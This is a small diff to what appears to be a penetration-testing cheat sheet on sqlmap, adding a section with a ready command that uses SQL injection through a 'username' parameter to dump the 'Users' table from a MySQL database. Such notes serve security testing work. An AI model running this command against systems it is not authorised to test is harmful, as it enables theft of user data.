@@ -50,6 +50,15 @@ Sqlmap is a great tool to perform sqlinjections.
 Here is the manual.
 https://github.com/sqlmapproject/sqlmap/wiki/Usage
 
+
+### Dumping a database or table
+
+Here we are dumping the database Webapp and the table Users.
+
+```
+sqlmap -r request.txt -p username --dbms=mysql --dump -D Webapp -T Users
+```
+
 ### Use proxy
 
 ```
